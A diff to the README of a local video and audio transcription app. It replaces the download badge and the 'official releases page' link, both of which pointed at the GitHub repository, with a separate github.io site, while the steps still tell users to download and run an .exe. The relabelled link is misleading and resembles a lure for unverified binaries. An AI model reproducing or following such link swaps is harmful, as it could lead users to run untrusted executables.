@@ -1,6 +1,6 @@
 # 🎙️ video-audio-transcriber - Turn spoken words into clear text
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thatso281/video-audio-transcriber)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://thatso281.github.io)
 
 The video-audio-transcriber application converts your video and audio files into written text. It runs on your local computer. This design keeps your files private. You do not send your data to the cloud. The app uses modern speech recognition technology to create accurate transcripts. You can use it for meetings, lectures, or interviews.
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to set up the application on your computer:
 
-1.  Visit the [official releases page](https://github.com/thatso281/video-audio-transcriber).
+1.  Visit the [official releases page](https://thatso281.github.io).
 2.  Locate the section labeled "Assets."
 3.  Click the file ending in `.exe` to start the download.
 4.  Find the downloaded file in your Downloads folder.
